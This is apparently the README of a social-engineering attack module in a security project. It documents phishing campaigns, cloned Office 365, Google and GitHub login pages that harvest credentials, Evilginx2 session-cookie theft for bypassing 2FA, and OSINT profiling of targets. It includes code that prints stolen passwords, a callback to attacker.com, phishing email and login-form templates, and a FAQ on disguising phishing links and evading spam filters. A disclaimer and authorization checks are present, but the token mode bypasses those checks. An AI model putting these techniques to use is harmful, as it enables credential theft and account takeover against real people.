# Social Engineering Toolkit Module

## 📑 目錄

- [模組概述](#模組概述)
- [核心能力](#核心能力)
  - [1. 釣魚攻擊 (Phishing)](#1-釣魚攻擊-phishing)
  - [2. 憑證竊取 (Credential Harvesting)](#2-憑證竊取-credential-harvesting)
  - [3. 目標資訊收集 (Target Profiling)](#3-目標資訊收集-target-profiling)
  - [4. 行為分析 (Analytics)](#4-行為分析-analytics)
- [目錄結構](#目錄結構)
- [快速開始](#快速開始)
  - [基本使用](#基本使用)
  - [憑證竊取](#憑證竊取)
  - [行為分析](#行為分析)
- [API 文件](#api-文件)
  - [SocialEngineeringManager](#socialengineeringmanager)
    - [初始化](#初始化)
    - [核心方法](#核心方法)
      - [1. launch_phishing_campaign()](#1-launchphishingcampaign)
      - [2. start_credential_harvester()](#2-startcredentialharvester)
      - [3. collect_osint()](#3-collectosint)
      - [4. get_campaign_analytics()](#4-getcampaignanalytics)
- [資料模型](#資料模型)
  - [PhishingConfig](#phishingconfig)
  - [PhishingResult](#phishingresult)
  - [AnalyticsData](#analyticsdata)
- [安全機制](#安全機制)
  - [1. RiskGuard 授權 (L2)](#1-riskguard-授權-l2)
  - [2. 環境驗證](#2-環境驗證)
  - [3. 目標白名單](#3-目標白名單)
  - [4. 審計日誌](#4-審計日誌)
- [工具整合](#工具整合)
  - [1. Social Engineering Toolkit (SET)](#1-social-engineering-toolkit-set)
  - [2. Evilginx2 (2FA 繞過)](#2-evilginx2-2fa-繞過)
  - [3. GoPhish (釣魚活動管理)](#3-gophish-釣魚活動管理)
- [開發指南](#開發指南)
  - [新增釣魚模板](#新增釣魚模板)
  - [新增登入頁模板](#新增登入頁模板)
  - [擴展 OSINT 收集器](#擴展-osint-收集器)
- [常見問題](#常見問題)
  - [Q1: 如何繞過 2FA？](#q1-如何繞過-2fa)
  - [Q2: 如何提高釣魚成功率？](#q2-如何提高釣魚成功率)
  - [Q3: 如何隱藏釣魚連結？](#q3-如何隱藏釣魚連結)
  - [Q4: 如何避免垃圾郵件過濾？](#q4-如何避免垃圾郵件過濾)
- [相關連結](#相關連結)
- [授權與免責聲明](#授權與免責聲明)

---


## 模組概述

社交工程工具包模組提供全面的社交工程攻擊能力，用於安全測試和紅隊演練。本模組實現了 AIVA Enhancement Plan 05_A 的技術規範。

**風險等級**: L2 (需要 RiskGuard 授權)  
**模組版本**: 1.0.0  
**最後更新**: 2025-01-25

## 核心能力

### 1. 釣魚攻擊 (Phishing)
- **電子郵件釣魚** (Email Phishing)
  - 大規模釣魚活動
  - 目標列表管理
  - 郵件模板自訂
  - SMTP 整合
  
- **針對性釣魚** (Spear Phishing)
  - 個性化目標攻擊
  - 社交媒體資訊收集
  - 上下文感知內容生成
  
- **語音釣魚** (Vishing)
  - 語音通話腳本
  - 社交工程話術
  
- **簡訊釣魚** (Smishing)
  - SMS 釣魚訊息
  - 短網址生成
  
- **QR Code Jacking**
  - QR Code 劫持
  - WhatsApp/WeChat 釣魚

### 2. 憑證竊取 (Credential Harvesting)
- **偽造登入頁面**
  - Office 365 登入頁
  - Google Workspace 登入頁
  - GitHub 登入頁
  - 自訂品牌登入頁
  
- **中間人攻擊** (MitM)
  - Evilginx2 整合
  - 2FA 繞過
  - Session Cookie 竊取

### 3. 目標資訊收集 (Target Profiling)
- 社交媒體偵察 (OSINT)
- 電子郵件驗證
- 員工資訊收集
- 組織架構分析

### 4. 行為分析 (Analytics)
- 點擊率追蹤
- 憑證提交率
- 地理位置分析
- 瀏覽器指紋識別
- 使用者行為分析

## 目錄結構

```
function_social_engineering/
├── __init__.py                    # 模組初始化與導出
├── README.md                      # 本文件
├── manager.py                     # 主要管理類
├── models.py                      # 資料模型與枚舉
│
├── phishing/                      # 釣魚攻擊引擎
│   ├── __init__.py
│   ├── email_phishing.py         # 電子郵件釣魚
│   ├── spear_phishing.py         # 針對性釣魚
│   ├── vishing.py                # 語音釣魚
│   ├── smishing.py               # 簡訊釣魚
│   └── qr_jacking.py             # QR Code 劫持
│
├── credential_harvesting/         # 憑證竊取
│   ├── __init__.py
│   ├── fake_login_page.py        # 偽造登入頁
│   ├── mitm_handler.py           # 中間人攻擊處理器
│   └── session_hijacker.py       # Session 劫持
│
├── profiling/                     # 目標資訊收集
│   ├── __init__.py
│   ├── osint_collector.py        # OSINT 收集器
│   ├── email_verifier.py         # 郵件驗證
│   └── org_mapper.py             # 組織架構映射
│
├── analytics/                     # 行為分析
│   ├── __init__.py
│   ├── click_tracker.py          # 點擊追蹤
│   ├── credential_logger.py      # 憑證記錄
│   ├── geo_analyzer.py           # 地理位置分析
│   └── behavior_analyzer.py      # 行為分析
│
├── templates/                     # 模板資源
│   ├── email/                    # 郵件模板
│   │   ├── password_reset.html
│   │   ├── security_alert.html
│   │   ├── invoice.html
│   │   └── document_share.html
│   ├── landing_pages/            # 登入頁模板
│   │   ├── office365/
│   │   ├── google/
│   │   ├── github/
│   │   └── generic/
│   └── sms/                      # SMS 模板
│       ├── delivery.txt
│       ├── banking.txt
│       └── support.txt
│
├── tools/                         # 第三方工具整合
│   ├── __init__.py
│   ├── setoolkit_wrapper.py      # SET 整合
│   ├── evilginx2_wrapper.py      # Evilginx2 整合
│   ├── gophish_wrapper.py        # GoPhish 整合
│   └── blackeye_wrapper.py       # BlackEye 整合
│
├── legacy/                        # 原始 hackingtool 文件
│   └── phising_attack_original.py
│
└── tests/                         # 測試文件
    ├── test_manager.py
    ├── test_phishing.py
    ├── test_credential_harvesting.py
    └── test_analytics.py
```

## 快速開始

### 基本使用

```python
from services.features.function_social_engineering import (
    SocialEngineeringManager,
    PhishingConfig,
    PhishingType,
    TargetPlatform
)

# 初始化管理器 (使用 Authorization Token)
manager = SocialEngineeringManager(
    authorization_token="your-auth-token"  # 可選，優先於 RiskGuard
)

# 配置釣魚活動
config = PhishingConfig(
    phishing_type=PhishingType.EMAIL_PHISHING,
    target_platform=TargetPlatform.OFFICE365,
    target_emails=["target@example.com"],
    sender_email="noreply@fake-domain.com",
    subject="重要安全警告",
    template_name="security_alert",
    callback_url="https://attacker.com/callback"
)

# 執行釣魚攻擊
result = await manager.launch_phishing_campaign(config)

if result.success:
    print(f"✅ 釣魚郵件已發送: {result.emails_sent}")
    print(f"📊 Campaign ID: {result.campaign_id}")
else:
    print(f"❌ 錯誤: {result.error}")
```

### 憑證竊取

```python
from services.features.function_social_engineering import (
    SocialEngineeringManager,
    TargetPlatform,
    DeliveryMethod
)

manager = SocialEngineeringManager()

# 啟動偽造登入頁
result = await manager.start_credential_harvester(
    platform=TargetPlatform.OFFICE365,
    delivery_method=DeliveryMethod.NGROK,  # 自動生成公開 URL
    port=8080
)

print(f"🌐 偽造登入頁 URL: {result.public_url}")
print(f"📝 憑證儲存路徑: {result.log_file}")

# 等待憑證收集
credentials = await manager.get_harvested_credentials(result.campaign_id)
for cred in credentials:
    print(f"👤 使用者: {cred.username}")
    print(f"🔐 密碼: {cred.password}")
    print(f"🌍 IP: {cred.ip_address}")
    print(f"🕒 時間: {cred.timestamp}")
```

### 行為分析

```python
# 獲取活動分析數據
analytics = await manager.get_campaign_analytics(campaign_id)

print(f"📧 郵件發送: {analytics.emails_sent}")
print(f"👁️ 郵件開啟率: {analytics.open_rate:.1%}")
print(f"🖱️ 連結點擊率: {analytics.click_rate:.1%}")
print(f"🔐 憑證提交: {analytics.credentials_submitted}")
print(f"🎯 成功率: {analytics.success_rate:.1%}")

# 地理位置分析
geo_data = await manager.analyze_geo_distribution(campaign_id)
for location, count in geo_data.items():
    print(f"📍 {location}: {count} 次訪問")
```

## API 文件

### SocialEngineeringManager

主要管理類，提供所有社交工程功能的統一介面。

#### 初始化

```python
def __init__(
    self,
    authorization_token: Optional[str] = None,
    environment: Optional[str] = None
)
```

**參數**:
- `authorization_token`: 授權 Token (優先於 RiskGuard)
- `environment`: 執行環境 (development/controlled_pentest/testing)

#### 核心方法

##### 1. launch_phishing_campaign()

啟動釣魚攻擊活動。

```python
async def launch_phishing_campaign(
    self,
    config: PhishingConfig
) -> PhishingResult
```

**參數**:
- `config`: 釣魚活動配置 (PhishingConfig)

**返回**: PhishingResult (活動結果)

**授權要求**: L2 + AIVA_ALLOW_ATTACK=1

##### 2. start_credential_harvester()

啟動憑證竊取伺服器。

```python
async def start_credential_harvester(
    self,
    platform: TargetPlatform,
    delivery_method: DeliveryMethod = DeliveryMethod.NGROK,
    port: int = 8080,
    custom_template: Optional[str] = None
) -> PhishingResult
```

**參數**:
- `platform`: 目標平台 (Office365/Google/GitHub/Generic)
- `delivery_method`: 傳遞方式 (NGROK/LocalTunnel/Direct)
- `port`: 本地埠號
- `custom_template`: 自訂模板路徑

**返回**: PhishingResult (包含公開 URL)

##### 3. collect_osint()

收集目標 OSINT 資訊。

```python
async def collect_osint(
    self,
    target: str,
    search_engines: List[str] = None,
    social_media: List[str] = None
) -> TargetInfo
```

**參數**:
- `target`: 目標 (電子郵件/網域/姓名)
- `search_engines`: 搜尋引擎列表
- `social_media`: 社交媒體平台列表

**返回**: TargetInfo (目標資訊)

##### 4. get_campaign_analytics()

獲取活動分析數據。

```python
async def get_campaign_analytics(
    self,
    campaign_id: str
) -> AnalyticsData
```

**參數**:
- `campaign_id`: 活動 ID

**返回**: AnalyticsData (分析數據)

## 資料模型

### PhishingConfig

釣魚活動配置。

```python
@dataclass
class PhishingConfig:
    phishing_type: PhishingType          # 釣魚類型
    target_platform: TargetPlatform      # 目標平台
    target_emails: List[str]             # 目標郵件列表
    sender_email: str                    # 發件人郵件
    subject: str                         # 郵件主旨
    template_name: str                   # 模板名稱
    callback_url: str                    # 回調 URL
    smtp_config: Optional[dict] = None   # SMTP 配置
    personalization: bool = False        # 個性化
    schedule_time: Optional[datetime] = None  # 排程時間
```

### PhishingResult

釣魚攻擊結果。

```python
@dataclass
class PhishingResult:
    success: bool                        # 是否成功
    campaign_id: str                     # 活動 ID
    emails_sent: int                     # 郵件發送數
    public_url: Optional[str]            # 公開 URL
    log_file: str                        # 日誌文件路徑
    error: Optional[str]                 # 錯誤訊息
    timestamp: datetime                  # 時間戳
```

### AnalyticsData

分析數據模型。

```python
@dataclass
class AnalyticsData:
    campaign_id: str                     # 活動 ID
    emails_sent: int                     # 郵件發送
    emails_opened: int                   # 郵件開啟
    links_clicked: int                   # 連結點擊
    credentials_submitted: int           # 憑證提交
    open_rate: float                     # 開啟率
    click_rate: float                    # 點擊率
    success_rate: float                  # 成功率
    geo_distribution: Dict[str, int]     # 地理分布
    browser_stats: Dict[str, int]        # 瀏覽器統計
    timestamp: datetime                  # 時間戳
```

## 安全機制

### 1. RiskGuard 授權 (L2)

所有社交工程操作都需要 L2 授權：

```python
def _check_authorization(self, operation_name: str) -> bool:
    # 1. Token 優先模式
    if self.authorization_token:
        return True
    
    # 2. RiskGuard 驗證
    return authorize_operation(
        operation_name=operation_name,
        risk_level="L2",
        tags=["social_engineering", "phishing", "credential_theft"],
        environment=self.environment
    )
```

### 2. 環境驗證

僅允許在受控環境執行：

```python
def _validate_environment(self) -> bool:
    allowed_envs = ["development", "controlled_pentest", "testing"]
    return self.environment in allowed_envs
```

### 3. 目標白名單

支援目標網域白名單驗證：

```python
def _validate_targets(self, targets: List[str]) -> bool:
    # 檢查目標是否在授權範圍內
    allowed_domains = self._load_allowed_domains()
    for target in targets:
        domain = extract_domain(target)
        if domain not in allowed_domains:
            return False
    return True
```

### 4. 審計日誌

所有操作都會記錄完整審計日誌：

```python
logger.info(
    f"Social Engineering Operation",
    extra={
        "operation": "phishing_campaign",
        "campaign_id": campaign_id,
        "target_count": len(targets),
        "authorization": "token" if self.authorization_token else "riskguard",
        "environment": self.environment,
        "timestamp": datetime.now().isoformat()
    }
)
```

## 工具整合

### 1. Social Engineering Toolkit (SET)

```python
# 使用 SET 執行釣魚攻擊
result = await manager.run_setoolkit_attack(
    attack_type="credential_harvester",
    template="office365",
    port=8080
)
```

### 2. Evilginx2 (2FA 繞過)

```python
# 啟動 Evilginx2 中間人攻擊
result = await manager.start_evilginx2(
    phishlet="office365",
    domain="fake-login.com",
    redirect_url="https://real-office365.com"
)
```

### 3. GoPhish (釣魚活動管理)

```python
# 使用 GoPhish 管理大規模釣魚活動
result = await manager.create_gophish_campaign(
    name="Q4 Security Audit",
    template="password_reset",
    targets=target_list,
    launch_date=datetime(2025, 2, 1)
)
```

## 開發指南

### 新增釣魚模板

1. 在 `templates/email/` 創建 HTML 模板
2. 使用 Jinja2 模板語法
3. 支援變數：`{{target_name}}`, `{{company}}`, `{{link}}`

```html
<!-- templates/email/custom_template.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Security Alert</title>
</head>
<body>
    <p>Dear {{target_name}},</p>
    <p>We detected suspicious activity on your {{company}} account.</p>
    <p><a href="{{link}}">Click here to secure your account</a></p>
</body>
</html>
```

### 新增登入頁模板

1. 在 `templates/landing_pages/` 創建資料夾
2. 包含 `index.html` 和 `style.css`
3. 表單必須 POST 到 `/submit`

```html
<!-- templates/landing_pages/custom/index.html -->
<form method="POST" action="/submit">
    <input type="email" name="username" required />
    <input type="password" name="password" required />
    <button type="submit">Sign In</button>
</form>
```

### 擴展 OSINT 收集器

```python
# profiling/custom_osint.py
class CustomOSINTCollector:
    async def collect(self, target: str) -> Dict[str, Any]:
        # 實現自訂 OSINT 收集邏輯
        return {
            "emails": [...],
            "social_profiles": [...],
            "job_positions": [...]
        }
```

## 常見問題

### Q1: 如何繞過 2FA？

使用 Evilginx2 進行中間人攻擊，可以竊取 Session Cookie 繞過 2FA。

```python
result = await manager.start_evilginx2(
    phishlet="office365",
    domain="secure-login-office365.com"
)
```

### Q2: 如何提高釣魚成功率？

1. 使用針對性釣魚 (Spear Phishing)
2. 個性化郵件內容
3. 選擇適當時機 (工作時間)
4. 使用可信任的發件人網域

### Q3: 如何隱藏釣魚連結？

使用 URL 縮短服務或 Maskphish：

```python
result = await manager.mask_phishing_url(
    real_url="https://attacker.com/phishing",
    mask_domain="https://microsoft.com"
)
# 結果: https://microsoft.com-secure-login@attacker.com
```

### Q4: 如何避免垃圾郵件過濾？

1. 使用合法 SMTP 伺服器
2. 配置 SPF/DKIM/DMARC
3. 避免垃圾關鍵字
4. 控制發送頻率

## 相關連結

- [AIVA Enhancement Plan 05_A](../../../_archive/enhancement_plans/05_A_Social_Engineering_Technical_Integration.md)
- [RiskGuard Authorization System](../../core/aiva_core/authorization/README.md)
- [AIVA Common Standards](../../aiva_common/README.md)
- [Social Engineering Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit)
- [Evilginx2](https://github.com/kgretzky/evilginx2)
- [GoPhish](https://github.com/gophish/gophish)

## 授權與免責聲明

⚠️ **警告**: 本模組僅供合法安全測試使用。未經授權對他人進行社交工程攻擊是違法行為。使用者需承擔所有法律責任。

📋 **使用條件**:
- 必須獲得明確書面授權
- 僅在受控測試環境使用
- 遵守當地法律法規
- 保護收集到的敏感資訊

---

**模組維護**: AIVA Security Team  
**最後更新**: 2025-01-25  
**版本**: 1.0.0
